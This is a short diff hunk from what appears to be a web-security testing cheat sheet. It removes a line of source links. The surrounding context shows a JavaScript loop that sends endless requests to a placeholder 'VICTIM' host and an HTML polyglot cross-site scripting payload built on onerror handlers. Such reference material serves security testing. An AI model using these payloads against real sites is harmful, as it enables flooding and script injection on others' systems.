@@ -2911,7 +2911,6 @@ Manually testing for XXE vulnerabilities generally involves
   ```JavaScript
   for(;;){fetch('https://VICTIM/',{method:'GET'});}
   ```
-  - [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
 - ```HTML
   data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
   ```
